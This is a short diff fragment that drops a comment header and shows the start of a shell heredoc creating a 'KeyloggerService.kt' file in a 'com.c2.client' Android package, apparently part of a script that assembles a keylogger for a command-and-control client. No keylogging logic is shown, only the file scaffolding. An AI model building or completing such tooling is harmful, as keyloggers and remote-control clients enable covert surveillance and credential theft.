@@ -1,4 +1,4 @@
-# ═══ KeyloggerService.kt ═══
+
 cat > app/src/main/java/com/c2/client/KeyloggerService.kt << 'EOF'
 package com.c2.client
 
